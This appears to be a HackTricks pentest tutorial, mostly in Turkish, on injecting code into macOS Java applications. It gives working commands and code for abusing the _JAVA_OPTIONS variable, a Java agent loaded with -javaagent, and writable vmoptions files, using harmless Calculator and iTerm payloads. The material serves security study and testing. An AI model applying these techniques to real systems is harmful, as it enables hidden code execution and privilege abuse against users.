# macOS Java Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Enumeration

Sisteminizde yüklü Java applications uygulamalarını bulun. **Info.plist** içindeki Java apps uygulamalarının, **`java.`** dizesini içeren bazı Java parametrelerine sahip olduğu gözlemlenmiştir; bu nedenle şu şekilde arama yapabilirsiniz:
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA_OPTIONS

**`_JAVA_OPTIONS`** ortam değişkeni, bir Java uygulaması başlatıldığında rastgele Java VM parametreleri enjekte etmek için kullanılabilir.<sup>[[1]](#references)</sup>
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
Bunu yeni bir process olarak ve mevcut terminalin child process'i olmadan çalıştırmak için şunu kullanabilirsiniz:
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
Ancak bu teknik, çalıştırılan uygulamada bir hatayı tetikler. Daha gizli bir alternatif, bir Java agent oluşturup `-javaagent` kullanmaktır:<sup>[[2]](#references)</sup>
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
> [!CAUTION]
> Agent'ı uygulamadan **farklı bir Java sürümüyle** oluşturmak hem agent'ın hem de uygulamanın çökmesine neden olabilir.

Agent'ın bulunabileceği yerler:
```java:Agent.java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
Agent'i derlemek için şunu çalıştırın:
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
`manifest.txt` ile:
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
Ardından env değişkenini dışa aktarın ve Java uygulamasını şu şekilde çalıştırın:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## vmoptions dosyası

Bu dosya, Java çalıştırıldığında **Java parametrelerinin** belirtilmesini destekler. Önceki tekniklerden bazılarını kullanarak Java parametrelerini değiştirebilir ve **sürecin arbitrary komutları çalıştırmasını** sağlayabilirsiniz.\
Ayrıca bu dosya, `include` yönergesiyle **başka dosyaları da içerebilir**; dolayısıyla dahil edilen bir dosyayı da değiştirebilirsiniz.

Dahası, bazı Java uygulamaları **birden fazla `vmoptions`** dosyası **yükler**.

Android Studio gibi bazı uygulamalar, bu dosyaları **nerede aradıklarını çıktılarında belirtir**:<sup>[[3]](#references)</sup>
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
Yoksa şu komutla kontrol edebilirsiniz:
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
Bu örnekte Android Studio'nun **`/Applications/Android Studio.app.vmoptions`** dosyasını yüklemeye çalıştığına dikkat edin; bu konuma **`admin` grubundaki herhangi bir kullanıcı yazma erişimine sahiptir**.

## References

- [1] [OpenJDK — `arguments.cpp` içinde `_JAVA_OPTIONS` ayrıştırması](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
- [2] [Oracle Java — `java.lang.instrument` paket belirtimi](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
- [3] [JetBrains — JVM seçeneklerini ve platform özelliklerini yapılandırma](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
{{#include ../../../banners/hacktricks-training.md}}
